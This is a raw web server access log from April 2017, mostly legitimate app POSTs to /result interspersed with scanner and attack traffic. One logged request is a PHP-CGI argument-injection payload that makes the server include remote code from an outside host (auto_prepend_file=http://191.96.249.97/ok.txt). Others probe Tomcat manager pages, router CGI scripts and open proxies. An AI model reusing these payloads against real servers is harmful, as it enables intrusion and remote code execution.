132.205.229.109 - - [13/Apr/2017:20:39:31 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:40:38 +0000] "POST /result HTTP/1.1" 200 62 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:42:20 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:44:45 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:45:24 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:46:35 +0000] "POST /result HTTP/1.1" 200 62 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:47:17 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:48:00 +0000] "POST /result HTTP/1.1" 200 83 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:53:16 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:01:59 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:03:22 +0000] "POST /result HTTP/1.1" 200 51 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:04:01 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:04:31 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:05:50 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:13:29 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:13:51 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:14:04 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:14:29 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:21:15:09 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:16:33 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
24.114.98.239 - - [13/Apr/2017:21:16:45 +0000] "POST /result HTTP/1.1" 200 29 "-" "python-requests/2.13.0"
142.169.78.83 - - [13/Apr/2017:21:17:30 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:19:05 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:24:12 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:33:30 +0000] "POST /result HTTP/1.1" 200 56 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:34:42 +0000] "POST /result HTTP/1.1" 200 56 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.125 - - [13/Apr/2017:21:36:01 +0000] "POST /result HTTP/1.1" 200 51 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
142.169.78.83 - - [13/Apr/2017:21:40:12 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:21:48:42 +0000] "POST /result HTTP/1.1" 200 56 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.125 - - [13/Apr/2017:21:52:32 +0000] "GET / HTTP/1.1" 200 2658 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:21:52:35 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
142.169.78.83 - - [13/Apr/2017:21:55:57 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x03q\xF4\x1A-\x92\x15\x982\xA8\x90\xD0<\xFA\xC58\xDAPp\xC8$ m_\xEB\x1DW\x01\xF0[!-\x94\x00\x00 zz\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xCC\x14\xCC\x13\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x00" 400 181 "-" "-"
24.114.83.141 - - [13/Apr/2017:22:05:01 +0000] "GET / HTTP/1.1" 200 2232 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /static/js/recorder.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /static/js/jquery-1.11.2.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /static/js/record_mic.js HTTP/1.1" 304 0 "http://35.163.12.69:81/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:05:02 +0000] "GET /favicon.ico HTTP/1.1" 404 1026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:29:34 +0000] "GET / HTTP/1.1" 200 2770 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:29:35 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:32:07 +0000] "GET / HTTP/1.1" 200 2765 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:32:08 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.83.141 - - [13/Apr/2017:22:35:39 +0000] "GET / HTTP/1.1" 200 2762 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
188.36.250.14 - - [13/Apr/2017:22:43:35 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
24.114.83.141 - - [13/Apr/2017:22:47:49 +0000] "POST /result HTTP/1.1" 200 85 "-" "curl/7.47.0"
24.114.83.141 - - [13/Apr/2017:22:49:09 +0000] "GET /result HTTP/1.1" 500 77655 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
142.169.78.83 - - [13/Apr/2017:23:04:01 +0000] "POST /result HTTP/1.1" 200 29 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [13/Apr/2017:23:04:18 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.125 - - [13/Apr/2017:23:11:42 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x03\x16)\x99\x98\x0F\xDE\xE6n\x92vFb\xF7\x04\xFD\x8C\x8E2>\x03}\xAE\x8D\x07\x95\x1A\xE3\xDA\xD9@D\xDB\x00\x00 \x1A\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xCC\x14\xCC\x13\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x00" 400 181 "-" "-"
142.169.78.83 - - [14/Apr/2017:00:16:00 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [14/Apr/2017:00:16:15 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [14/Apr/2017:00:18:30 +0000] "POST /result HTTP/1.1" 200 51 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.125 - - [14/Apr/2017:00:23:24 +0000] "POST /result HTTP/1.1" 200 59 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
132.205.229.125 - - [14/Apr/2017:00:26:51 +0000] "POST /result HTTP/1.1" 200 62 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
132.205.229.125 - - [14/Apr/2017:00:32:40 +0000] "POST /result HTTP/1.1" 200 56 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
24.114.83.22 - - [14/Apr/2017:00:34:05 +0000] "POST /result HTTP/1.1" 200 57 "-" "python-requests/2.13.0"
142.169.78.83 - - [14/Apr/2017:00:36:14 +0000] "POST /result HTTP/1.1" 200 56 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
24.114.83.22 - - [14/Apr/2017:00:47:04 +0000] "POST /result HTTP/1.1" 200 58 "-" "python-requests/2.13.0"
24.114.83.22 - - [14/Apr/2017:00:49:25 +0000] "POST /result HTTP/1.1" 200 57 "-" "python-requests/2.13.0"
24.114.83.22 - - [14/Apr/2017:00:53:12 +0000] "POST /result HTTP/1.1" 200 57 "-" "python-requests/2.13.0"
24.114.83.22 - - [14/Apr/2017:00:55:00 +0000] "POST /result HTTP/1.1" 200 58 "-" "python-requests/2.13.0"
142.169.78.83 - - [14/Apr/2017:01:22:25 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [14/Apr/2017:01:23:34 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.169.78.83 - - [14/Apr/2017:01:23:49 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
24.114.91.87 - - [14/Apr/2017:01:25:09 +0000] "POST /result HTTP/1.1" 200 58 "-" "python-requests/2.13.0"
142.169.78.83 - - [14/Apr/2017:01:46:12 +0000] "POST /result HTTP/1.1" 200 51 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
192.222.220.68 - - [14/Apr/2017:04:08:16 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
188.36.250.14 - - [14/Apr/2017:09:17:57 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.36.250.14 - - [14/Apr/2017:12:45:04 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
192.222.220.68 - - [14/Apr/2017:15:15:22 +0000] "POST /result HTTP/1.1" 200 51 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
192.222.220.68 - - [14/Apr/2017:16:38:09 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
185.27.217.34 - - [14/Apr/2017:18:13:31 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
71.82.146.39 - - [14/Apr/2017:18:49:08 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:49:53 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:50:38 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:51:23 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:52:08 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:52:53 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:53:39 +0000] "POST / HTTP/1.1" 502 583 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; MATBJS)"
71.82.146.39 - - [14/Apr/2017:18:54:24 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
185.69.69.72 - - [14/Apr/2017:20:57:28 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
185.110.132.232 - - [14/Apr/2017:20:58:20 +0000] "GET / HTTP/1.1" 502 181 "-" "Scanbot"
139.162.108.53 - - [14/Apr/2017:21:20:51 +0000] "GET / HTTP/1.1" 502 583 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
71.82.146.39 - - [14/Apr/2017:21:27:03 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:27:48 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:28:33 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:29:19 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:30:11 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:30:56 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:31:41 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:32:26 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:33:11 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:33:57 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:34:42 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:35:27 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:36:12 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:36:59 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:37:44 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:38:29 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:39:14 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:40:00 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:40:45 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:41:30 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:42:16 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
71.82.146.39 - - [14/Apr/2017:21:43:01 +0000] "POST / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
36.103.1.63 - - [14/Apr/2017:22:20:10 +0000] "GET / HTTP/1.1" 200 5557 "http://35.163.12.69:81" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
183.129.160.229 - - [14/Apr/2017:22:36:55 +0000] "GET / HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
188.36.250.14 - - [14/Apr/2017:23:54:47 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.36.250.14 - - [15/Apr/2017:01:49:43 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
93.125.126.129 - - [15/Apr/2017:04:34:48 +0000] "GET /manager/html HTTP/1.1" 502 181 "-" "Mozilla/5.0"
191.96.249.97 - - [15/Apr/2017:07:40:23 +0000] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D\x22\x22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.1" 502 181 "-" "-"
61.164.149.128 - - [15/Apr/2017:12:02:35 +0000] "GET http://www.server110.com/ HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
61.164.149.128 - - [15/Apr/2017:12:02:37 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.128 - - [15/Apr/2017:12:02:37 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.128 - - [15/Apr/2017:12:02:38 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
185.69.69.72 - - [15/Apr/2017:13:33:51 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.36.250.14 - - [15/Apr/2017:13:51:50 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
188.36.250.14 - - [15/Apr/2017:14:35:45 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
222.186.21.42 - admin [15/Apr/2017:15:28:26 +0000] "GET /manager/html HTTP/1.1" 502 181 "-" "-"
222.186.21.42 - admin [15/Apr/2017:15:28:26 +0000] "GET /manager/html HTTP/1.1" 404 2893 "-" "-"
66.240.205.34 - - [15/Apr/2017:16:55:27 +0000] "GET / HTTP/1.1" 502 583 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
66.240.205.34 - - [15/Apr/2017:16:55:28 +0000] "GET /robots.txt HTTP/1.1" 502 181 "-" "-"
66.240.205.34 - - [15/Apr/2017:16:55:29 +0000] "GET /sitemap.xml HTTP/1.1" 502 181 "-" "-"
61.164.149.211 - - [15/Apr/2017:17:31:07 +0000] "GET http://www.server110.com/ HTTP/1.1" 200 5557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
61.164.149.211 - - [15/Apr/2017:17:31:07 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.211 - - [15/Apr/2017:17:31:07 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
61.164.149.211 - - [15/Apr/2017:17:31:08 +0000] "CONNECT www.linode.com:443 HTTP/1.1" 400 181 "-" "-"
185.69.69.72 - - [15/Apr/2017:18:05:18 +0000] "GET / HTTP/1.1" 502 181 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
212.232.44.250 - - [15/Apr/2017:20:28:41 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
212.232.45.250 - - [15/Apr/2017:20:28:41 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
210.209.228.102 - - [15/Apr/2017:21:10:46 +0000] "GET login.cgi HTTP/1.1" 400 181 "-" "-"
179.210.116.210 - - [15/Apr/2017:21:17:59 +0000] "GET /hndUnblock.cgi HTTP/1.0" 502 181 "-" "Wget(linux)"
179.210.116.210 - - [15/Apr/2017:21:17:59 +0000] "GET /tmUnblock.cgi HTTP/1.0" 502 181 "-" "Wget(linux)"
179.210.116.210 - - [15/Apr/2017:21:18:00 +0000] "POST /cgi?2 HTTP/1.0" 502 181 "-" "Wget(linux)"
179.210.116.210 - - [15/Apr/2017:21:18:00 +0000] "GET / HTTP/1.0" 502 181 "-" "Wget(linux)"
192.222.220.68 - - [15/Apr/2017:21:18:56 +0000] "POST /result HTTP/1.1" 200 51 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
192.222.220.68 - - [15/Apr/2017:21:19:11 +0000] "POST /result HTTP/1.1" 200 57 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
142.166.95.227 - - [15/Apr/2017:21:39:54 +0000] "GET / HTTP/1.0" 200 5538 "-" "-"
23.91.241.182 - - [15/Apr/2017:22:03:03 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [15/Apr/2017:22:03:04 +0000] "GET /favicon.ico HTTP/1.1" 502 181 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
